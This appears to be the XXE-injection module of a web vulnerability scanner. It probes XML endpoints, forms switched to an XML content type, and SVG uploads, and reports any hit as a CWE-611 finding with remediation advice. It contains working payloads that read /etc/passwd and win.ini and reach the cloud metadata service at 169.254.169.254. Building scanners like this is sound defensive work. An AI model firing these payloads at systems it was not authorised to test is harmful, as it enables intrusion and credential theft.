import re

from scanner.core import Finding, Severity, ScanSession

XXE_PAYLOADS = [
    {
        "name": "File Read (Linux)",
        "payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "indicator": r"root:[x*]:0:0:",
        "severity": Severity.CRITICAL,
        "validate": "passwd",
    },
    {
        "name": "File Read (Windows)",
        "payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]><root>&xxe;</root>',
        "indicator": r"\[fonts\]",
        "severity": Severity.CRITICAL,
        "validate": "winini",
    },
    {
        "name": "SSRF via XXE",
        "payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        "indicator": r"ami-id|instance-id|local-hostname",
        "severity": Severity.CRITICAL,
        "validate": None,
    },
]


def _validate_match(text: str, validate_type: str | None) -> bool:
    if validate_type == "passwd":
        lines = [l for l in text.split("\n") if re.match(r"^[a-z_][\w-]*:[^:]*:\d+:\d+:", l)]
        return len(lines) >= 3
    if validate_type == "winini":
        return "[fonts]" in text.lower() and "[extensions]" in text.lower()
    return True


def _is_xml_endpoint(resp) -> bool:
    content_type = resp.headers.get("Content-Type", "").lower()
    if any(ct in content_type for ct in ("application/xml", "text/xml", "application/soap+xml")):
        return True
    return resp.text.lstrip()[:5] == "<?xml"


def run(session: ScanSession) -> None:
    print("\n[*] Testing for XML External Entity (XXE) Injection...")

    _check_xml_endpoints(session)
    _check_content_type_switch(session)
    _check_file_upload_xxe(session)


def _check_xml_endpoints(session: ScanSession):
    for url in session.crawled_urls:
        resp = session.get(url)
        if not resp:
            continue

        if not _is_xml_endpoint(resp):
            continue

        baseline_text = resp.text

        for entry in XXE_PAYLOADS:
            test_resp = session.post(
                url,
                data=entry["payload"],
                headers={"Content-Type": "application/xml"},
            )
            if not test_resp or test_resp.status_code in (404, 403, 405):
                continue

            if re.search(entry["indicator"], test_resp.text, re.IGNORECASE):
                if re.search(entry["indicator"], baseline_text, re.IGNORECASE):
                    continue
                if not _validate_match(test_resp.text, entry.get("validate")):
                    continue
                session.add_finding(Finding(
                    title=f"XML External Entity (XXE): {entry['name']}",
                    severity=entry["severity"],
                    description=f"Endpoint at {url} is vulnerable to XXE injection ({entry['name']}).",
                    evidence=f"Payload type: {entry['name']}\nURL: {url}",
                    remediation="Disable external entity processing in the XML parser.",
                    url=url,
                    module="xxe",
                    cwe="CWE-611",
                    confirmed=True,
                ))
                return


def _check_content_type_switch(session: ScanSession):
    for form in session.forms:
        if form["method"] != "post":
            continue

        baseline_data = {}
        for inp in form["inputs"]:
            if inp.get("name"):
                baseline_data[inp["name"]] = inp.get("value", "test")
        baseline_resp = session.post(form["action"], data=baseline_data)
        baseline_text = baseline_resp.text if baseline_resp else ""

        for entry in XXE_PAYLOADS[:2]:
            resp = session.post(
                form["action"],
                data=entry["payload"],
                headers={"Content-Type": "application/xml"},
            )
            if not resp or resp.status_code in (404, 403, 405, 415):
                continue

            if re.search(entry["indicator"], resp.text, re.IGNORECASE):
                if re.search(entry["indicator"], baseline_text, re.IGNORECASE):
                    continue
                if not _validate_match(resp.text, entry.get("validate")):
                    continue
                session.add_finding(Finding(
                    title=f"XXE via Content-Type Switch: {entry['name']}",
                    severity=entry["severity"],
                    description=f"Form endpoint at {form['action']} accepts XML and is vulnerable to XXE.",
                    evidence=f"Form action: {form['action']}\nPayload: {entry['name']}",
                    remediation="Validate Content-Type on the server. Disable external entity processing.",
                    url=form.get("source_url", form["action"]),
                    module="xxe",
                    cwe="CWE-611",
                    confirmed=True,
                ))
                return


def _check_file_upload_xxe(session: ScanSession):
    svg_xxe = ('<?xml version="1.0" encoding="UTF-8"?>'
               '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
               '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
               '<text x="0" y="20">&xxe;</text></svg>')

    for form in session.forms:
        has_file = any(inp.get("type") == "file" for inp in form["inputs"])
        if not has_file:
            continue

        for inp in form["inputs"]:
            if inp.get("type") != "file":
                continue

            name = inp.get("name", "file")
            files = {name: ("test.svg", svg_xxe, "image/svg+xml")}

            other_data = {}
            for other in form["inputs"]:
                other_name = other.get("name")
                if not other_name or other.get("type") == "file":
                    continue
                other_data[other_name] = other.get("value", "test")

            resp = session.post(form["action"], files=files, data=other_data)
            if not resp or resp.status_code in (404, 403):
                continue

            if re.search(r"root:[x*]:0:0:", resp.text):
                lines = [l for l in resp.text.split("\n") if re.match(r"^[a-z_][\w-]*:[^:]*:\d+:\d+:", l)]
                if len(lines) >= 3:
                    session.add_finding(Finding(
                        title="XXE via SVG File Upload",
                        severity=Severity.CRITICAL,
                        description=f"File upload at {form['action']} processes SVG/XML and is vulnerable to XXE.",
                        evidence=f"Uploaded malicious SVG to field '{name}'",
                        remediation="Sanitize uploaded SVG/XML files. Strip DOCTYPE declarations.",
                        url=form.get("source_url", form["action"]),
                        module="xxe",
                        cwe="CWE-611",
                        confirmed=True,
                    ))
                    return
